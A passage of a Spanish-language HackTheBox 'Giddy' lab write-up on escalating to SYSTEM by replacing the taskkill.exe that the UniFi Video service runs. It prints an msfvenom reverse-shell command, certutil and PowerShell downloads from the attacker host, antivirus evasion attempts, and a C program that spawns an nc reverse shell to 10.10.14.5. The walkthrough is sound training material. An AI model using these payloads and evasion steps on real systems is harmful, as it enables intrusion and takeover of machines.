+  <p>By <strong>copying an arbitrary</strong> <code>taskkill.exe</code> to <code>C:\ProgramData\\unifi-video\</code> as an unprivileged user, it is therefore possible to <strong>escalate privileges and execute arbitrary code as NT AUTHORITY/SYSTEM</strong>.</p>
+</blockquote>
+
+<p>:o upaaaa, pues sencillo, solo debemos encontrar el nombre del servicio, generar un payload malicioso puede ser con ayuda de <code>msfvenom</code> llamado <code>taskkill.exe</code> y posicionarlo en la ruta <code>C:\ProgramData\\unifi-video\</code>. Lo siguiente seria detener o iniciar el servicio, esperar que busque el archivo <code>taskkill.exe</code>, lo ejecute y ver como obtenemos nuestra Shell (:</p>
+
+<p>Démosleeeeeeeeeeeeeeeeeeeeeeeeeeeee.</p>
+
+<p>…</p>
+
+<h3 id="msfvenom-taskkillexe">Generamos archivo <u>taskkill.exe</u> malicioso <a href="#msfvenom-taskkillexe">🔗</a></h3>
+
+<p>Creemos nuestro binario <code>taskkill.exe</code> con ayuda de <code>msfvenom</code>, le indicaremos que una vez se ejecute envíe una petición hacia X puerto con una <strong>CMD</strong>, o sea, generamos una <strong>Reverse Shell</strong>:</p>
+
+<pre><code class="language-bash">❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4433 -f exe &gt; taskkill.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+</code></pre>
+
+<p>Listo, ya lo tenemos, sigamos…</p>
+
+<h3 id="find-service-unifivideo">Buscamos servicio relacionado con <u>unifi-video</u> <a href="#find-service-unifivideo">🔗</a></h3>
+
+<p>Ahora lo que debemos hacer es listar toodos los servicios del sistema y buscar específicamente alguno relacionado con <code>unifi-video</code>.</p>
+
+<p>Pero F, los comandos que podemos usar o nos matan la terminal o nos devuelven errores:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData&gt; net start
+net.exe : System error 5 has occurred.
+...
+Access is denied.
+</code></pre>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData&gt; wmic service list brief
+WMIC.exe : ERROR:
+...
+Description = Access denied
+</code></pre>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData&gt; Get-Service
+Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
+...
+</code></pre>
+
+<blockquote>
+  <p>Tomadas de <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services">Hacktricks.xyz - WinPrivEsc/Services</a>.</p>
+</blockquote>
+
+<p>Así que tamos tristes :(</p>
+
+<p>Buscando en internet maneras de detener o iniciar procesos con <strong>PowerShell</strong>, encontramos dos herramientas:</p>
+
+<ul>
+  <li><a href="https://www.windows-commandline.com/start-stop-service-using-powershell/">Powershell: How to Start (<strong>start-service</strong>) or Stop (<strong>stop-service</strong>) services</a>.</li>
+</ul>
+
+<p>Pero seguimos igual, no sabemos el nombre del servicio…</p>
+
+<p>Probando algunos randoms siempre recibimos un error, por ejemplo buscando <code>unifi-video</code> como nombre de servicio:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; Stop-Service "unifi-video"
+Cannot find any service with service name 'unifi-video'.
+...
+</code></pre>
+
+<p>:(</p>
+
+<p>Si volvemos a nuestro exploit, en los detalles de la vulnerabilidad hace referencia a un servicio con nombre <code>Ubiquiti UniFi Video</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_unifi_exploitDB_service.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Así que podemos probar con ese nombre, si no nos funciona ya tendríamos una base para quitar, agregar, modificar o juntar <strong>palabras</strong> en busca de algún nombre para el servicio.</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; Stop-Service "Ubiquiti UniFi Video"
+Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
+</code></pre>
+
+<p>OPAAAAAAAAAAAAAAA, si señorrrrrrrrrrr, al parecer tenemos el nombre del serviciooooooooooooooooooo, pues perfectisimo, ahora simplemente nos queda probar a subir el binario y recibir nuestra <strong>reverse Shell</strong>:</p>
+
+<h3 id="uploading-taskkillexe-ways">Subimos el binario al sistema de diferentes maneras <a href="#uploading-taskkillexe-ways">🔗</a></h3>
+
+<p>Aprovechemos y subamos el binario de 3 formas, con <code>certutil.exe</code>, con una de las opciones de <code>PowerShell</code> yyy con ayuda de una carpeta compartida por <strong>SMB</strong>:</p>
+
+<p>Levantemos un servidor web con <strong>Python</strong> en la ruta donde tenemos el archivo <code>taskkill.exe</code>:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+</code></pre>
+
+<hr />
+
+<h5 id="certutilexe-1"><u>certutil.exe:</u></h5>
+
+<hr />
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; certutil.exe -f -urlcache -split http://10.10.14.5:8000/taskkill.exe taskkill.exe
+****  Online  ****
+  000000  ...
+  01204a
+CertUtil: -URLCache command completed successfully.
+</code></pre>
+
+<p>Y ya lo tendriamos (:</p>
+
+<h5 id="usando-la-clase-invokewebrequest-de-powershell-1"><u>Usando la clase InvokeWebRequest de PowerShell:</u></h5>
+
+<hr />
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10.10.14.5:8000/taskkill.exe -OutFile taskkill.exe
+</code></pre>
+
+<p>Y tambien ya tendriamos el binario en la máquina victima.</p>
+
+<h5 id="compartiendo-una-carpeta-con-smb-1"><u>Compartiendo una carpeta con SMB:</u></h5>
+
+<hr />
+
+<pre><code class="language-bash">❱ smbserver.py smbFolder $(pwd)
+</code></pre>
+
+<p>Ya tendríamos nuestra carpeta compartida llamada <code>smbFolder</code> situada en la ruta del binario <code>taskkill.exe</code>, ahora desde la máquina víctima le decimos que se conecte a esa carpeta, pero que además haga una copia de uno de sus archivos a la ruta actual:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; copy \\10.10.14.5\smbFolder\taskkill.exe taskkill.exe
+</code></pre>
+
+<p>Recibimos la peticion en nuestra carpeta compartida, esperamos un momento yyyyyyyyy ya tendriamos tambien nuestro archivo <code>taskkill.exe</code> (:</p>
+
+<p>Listos, ahora si explotemos estooooo.</p>
+
+<p>Pongamonos en escucha por el puerto <strong>4433</strong> que fue el que indicamos en nuestro binario malicioso:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<hr />
+
+<h3 id="trying-service-taskkillexe">Intentamos que el servicio <u>unifi-video</u> ejecute el binario malicioso <a href="#trying-service-taskkillexe">🔗</a></h3>
+
+<p>Jugando con el binario y el servicio:</p>
+
+<ul>
+  <li><code>Stop-Service "Ubiquiti UniFi Video"</code></li>
+  <li><code>Start-Service "Ubiquiti UniFi Video"</code></li>
+</ul>
+
+<p>No pasa nada de nada :P y por el contrario algo que nos damos cuenta es que el sistema nos borra <code>taskkill.exe</code>, si intentamos nosotros mismo ejecutarlo obtenemos esto:</p>
+
+<pre><code class="language-bash">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; .\taskkill.exe
+Program 'taskkill.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+...
+</code></pre>
+
+<p>Jmmm, al parecer el sistema esta identificando el binario como malicioso (lo és :P) y por consiguiente esta siendo borrado… Esto puede ser obra del <code>antivirus</code>, el propio <code>Windows Defender</code> o incluso de algún <code>App Locker</code>. Se pone linda la cosa ya que tendremos que bypassear alguno (o todos) de ellos :)</p>
+
+<p>…</p>
+
+<h3 id="bypass-av-and-things">Bypasseamos <u>Antivirus</u>, <u>Windows Defender</u>, <u>App Locker</u> y lo que se venga <a href="#bypass-av-and-things">🔗</a></h3>
+
+<hr />
+
+<h5 id="fail-con-phantom-evasion-1">Fail con <u>Phantom Evasion<u></u></u></h5>
+
+<p>Buscando y buscando encontramos finalmente un recurso que hace referencia a otro recurso y ese otro recurso habla de otro recurso, ese último se llama <a href="https://github.com/oddcod3/Phantom-Evasion">Phantom Evasion</a>, una herramienta para eso, evadir cositas como los antivirus.</p>
+
+<blockquote>
+  <p><span style="color: #f34336;">Esta parte es de aprendizaje en cuanto a la herramienta porque al final la explote de otro modo</span> :P</p>
+</blockquote>
+
+<p>Hay varios recursos que hablan de ella:</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=fgjTbUrAHbg">YT - Evasión de antivirus con Phantom Evasion</a>.</li>
+  <li><a href="https://noticiasseguridad.com/tutoriales/como-evadir-proteccion-antivirus-con-phantom-payloads/">Cómo evadir protección antivirus con Phantom Payloads</a>.</li>
+</ul>
+
+<p>Después de descargarlo, en su ejecución la interfaz es sencilla:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_phantomEvasion_menu.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Obviaremos algunas opciones, vamos a irnos por el número <code>1</code> directamente:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_phantomEvasion_modules.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Acá (podemos jugar con la primera, lo hice de todas las maneras posibles, pero F) seleccionamos la segunda opción, o sea escribimos <code>2</code>, esta opción nos generaría un binario que al ser ejecutado con éxito devolvería una falsa shell, es funcional para saber que tenemos ejecución de comandos y que estamos bypasseando el antivirus y los diferentes bloqueos que existan.</p>
+
+<p>Entonces, seleccionamos la opción <code>2</code>, nos devolverá la info inicial del binario a generar y empezara a preguntarnos algunas opciones, las importantes van a ser:</p>
+
+<ul>
+  <li><code>LHOST</code>: Nuestra IP, <strong>10.10.14.5</strong>.</li>
+  <li><code>LPORT</code>: El puerto donde vamos a estar en escucha, <strong>4433</strong>.</li>
+  <li><code>Strip executable?</code>: Indicamos la letra <code>Y</code>, para SIIIIIIIIIIIIIIIIIIIIII e.e Esto hace que el binario no sea tan pesado.</li>
+  <li>La opción del certificado me daba errores, así que la cambie por <code>n</code> y ya todo perfecto.</li>
+  <li><code>Insert output filename</code>: <strong>taskkill</strong>. Que será el nombre del binario, en la opción anterior por default esta la extensión <code>exe</code>, así que tamos bien.</li>
+</ul>
+
+<p>Nos responde:</p>
+
+<pre><code class="language-bash">[&gt;] Generating code...
+
+[&gt;] Compiling...
+
+[&gt;] Strip binary...
+
+[&lt;&gt;] File saved in Phantom-Evasion folder
+</code></pre>
+
+<p>Y si revisamos el directorio donde ejecutamos <code>phantom evasion</code> vemos el binario <code>taskkill.exe</code>:</p>
+
+<pre><code class="language-bash">❱ file taskkill.exe 
+taskkill.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
+</code></pre>
+
+<p>Listooones, pues ahora intentemos subirlo y jugar con el servicio, pero claro, si aún no estamos en escucha por el puerto del binario (4433) lo hacemos:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Subimos el binario, lo primero que vemos es que no nos lo borra, así que puede ser el bueno, encendemos y apagamos el servicio y cruzamos los dedos de los pies a ver si logramos algo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_stacyPS_startStop_service.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Es trivial cuantos warning nos va a mostrar :P peeeeeeeeeeeeeeero en cualquier momento vemos estoooooooooooooo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_nc_fakeshell_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si si siiiiiii, recibimos una petición, por lo tanto hemos bypasseado tooooooodo todito.</p>
+
+<p>Pero (siempre hay peros, ihsss) no podemos hacer nada con ese payload, lo bueno es que confirmamos a <code>phantom evasion</code> como funcional, ahora solo nos quedaría probar entre sus opciones y ver cuál nos puede devolver una verdadera shell…</p>
+
+<p>Pero (de nuevo un peroooooo), como ya comente antes, probé y probé y nada, no logre hacer funcionar una shell…</p>
+
+<p>…</p>
+
+<p>En este punto ya estaba loco locooooooo, no sabía pa onde mirar, así que necesitaba un momento de calmita, de respirar profundo y organizar ideas. Después de un rato, caí en cuenta de algo en lo que debí haber pensado desde el inicio, pero bueno, no pasa nada, aprendimos sobre la herramienta <code>phantom evasion</code>.</p>
+
+<p><strong>Y sí nos creamos nosotros mismos un binario llamado <code>taskkill.exe</code> que haga lo que queramos? u.u jajaj</strong></p>
+
+<p>…</p>
+
+<p>Pos sí, démosle a esa idea, podemos apoyarnos del lenguaje de programación <code>C</code> y su función <code>system();</code>, simplemente para compilar el script a un formato válido en <strong>Windows</strong> usamos la herramienta <code>mingw-w64</code>. A darleeeee:</p>
+
+<p>Entonces, si no tenemos ni idea, una búsqueda rápida en internet nos dará vaaarios ejemplos como base:</p>
+
+<ul>
+  <li><a href="https://www.w3resource.com/c-programming-exercises/variable-type/c-variable-type-exercises-1.php">C Exercises: Invoke the command processor to execute a command</a>.</li>
+</ul>
+
+<p>Lo tomamos y nos quedamos únicamente con las librerías, la función main y la función <code>system</code>:</p>
+
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+int main () {
+    system();
+} 
+</code></pre>
+
+<p>Donde <code>system</code> tendrá lo que queramos ejecutar a nivel de sistema, para no hacer más largo el writeup voy a hacer un spoiler, si no quieres verlo, NO OPRIMAS LO DE ABAJO e.e</p>
+
+<details>
+  <summary><strong>SPOILER resolución final</strong></summary>
+  
+  <span style="color: yellow;">El script y el binario generado van a ser la salvación e.e (esto no era lo que iba a escribir, pero pues me gusto, así que ahí se queda).</span>
+</details>
+
+<p>Como prueba anterior, subí el binario <code>nc.exe</code> a la máquina a ver si también era borrado, pero no, no lo borra el sistema, así que podemos indicarle al script que tome ese binario y nos haga una Reverse Shell de toda la vida:</p>
+
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+int main () {
+    system("c:\\Users\\Stacy\\Videos\\nc.exe 10.10.14.5 4433 -e cmd.exe");
+} 
+</code></pre>
+
+<p>Ya con el script finalizado lo compilamos, siguiendo este hilo lo logramos:</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/38786014/how-to-compile-executable-for-windows-with-gcc-with-linux-subsystem">How to compile executable for Windows with GCC with Linux Subsystem?</a>.</li>
+</ul>
+
+<p>Inicialmente lo compilare para <strong>64 bits</strong> si no nos sirve, pues lo intentamos con <strong>32</strong>:</p>
+
+<pre><code class="language-bash">❱ x86_64-w64-mingw32-gcc taskkill.c -o taskkill.exe
+</code></pre>
+
+<pre><code class="language-bash">❱ file taskkill.exe 
+taskkill.exe: PE32+ executable (console) x86-64, for MS Windows
+</code></pre>
+
+<p>Listo, ahora simplemente subimos tooodo, nos ponemos en escucha por el puerto <strong>4433</strong> yyyyyy jugamos con el servicio:</p>
+
+<p>…</p>
+
+<blockquote>
+  <p>Me tiré tooooooooodo lo que relacione a <code>Ruby</code> por instalar una herramienta que nos ayudaba con el <strong>Bypass de AV</strong>.</p>
+</blockquote>
+
+<p>(Y pues se fue a la p*** el <code>evil-winrm</code> asdjflkajsldkfñl)</p>
+
+<blockquote>
+  <p>Ya lo arreglé, tamos felices. Por no usar sandboxes o pequeños entornos que no afecten a las gemas y demás cositas. Algo más aprendido jajajaj a la fuerza pero aprendido.</p>
+</blockquote>
+
+<p>😇</p>
+
+<p>…</p>
+
+<p>Ahora sí, subamos todo a la máquina:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+</code></pre>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10.10.14.5:8000/taskkill.exe -OutFile taskkill.exe
+*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10.10.14.5:8000/nc64.exe -OutFile c:\Users\Stacy\Videos\nc.exe
+</code></pre>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Detenemos el servicio:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; stop-service "Ubiquiti UniFi Video"
+Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
+...
+</code></pre>
+
+<p>Yyyyyyyyyyyy en nuestro listeneeeeeeeeeeeeeeeeeeeer:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_nc_NTauthoritySH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>PERO CLAROOOOOOOOO QUE SIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII, OMG, mi cerebro respira e.e Tamos dentro del sistema como el usuario <strong>nt authority\system</strong>, el master de los masters.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_menhands_done.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Veamos las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>IT’S OOOOOOOOOOOOVER</p>
+
+<p>…</p>
+
+<p>Terminamos después de un largo camino, pero un camino llenísimo de aprendizaje, prácticamente todo lo que vimos en esta máquina fue nuevo para mí, así que increíble, muy lindo lo que hicimos y lo que probamos.</p>
+
+<p>Salió un bello script (que inicialmente no era la idea, iba a ser muuucho más sencillo, pero uff, me encanto), intentamos (lo logramos en gran medida) bypassear el AV, el Windows Defender, el App Locker y lo que se nos interpusiera e.e</p>
+
+<p>Muy linda máquina, brutalmente llevada a la realidad creo yo, una base de datos con 0 data importante, pero que puede permitir ejecutar comandos <strong>SQL</strong> y entornos super controlados, pero realmente no tanto, llega un script de visita con dos líneas y destruye todo lo que tenías “controlado” :(</p>
+
+<p>Bueno basta!! Los dejo descansar y perdón que a veces me extienda o haga cosas que para algunos son obvias, pero esa es la idea, dejar la obviedad de lado y reforzar cositas e incluso dejar que alguien con menos experiencia aprenda algo nuevo.</p>
+
+<p>Nos leeremos después y a seguir rompiendo tooodoooo no jodaaaaaaaaaaaaaaaaaa!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Giddy&url=http://localhost:4000/htb/giddy" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#C">C</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#MSSQL">MSSQL</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SQLi">SQLi</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#bypass-AV">bypass-AV</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#responder">responder</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#unifi-video">unifi-video</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#xp_dirtree">xp_dirtree</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/proper">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png" alt="HackTheBox - Proper"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/proper">HackTheBox - Proper</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Agregamos sal a nuestra inyección SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creación de scripts en PowerShell y pipes conseguiremos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/breadcrumbs">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png" alt="HackTheBox - Breadcrumbs"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/breadcrumbs">HackTheBox - Breadcrumbs</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contraseñas almacenadas, jugando con binarios encontramos una URL que nos llevara de la...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">17 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/writeup">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192banner.png" alt="HackTheBox - Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/writeup">HackTheBox - Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, nos miraremos a los ojos con un CMS vulnerable a SQLi time-based. Haremos reutilización de credenciales y encontraremos un PATH Hijacking guapetón.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">09 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
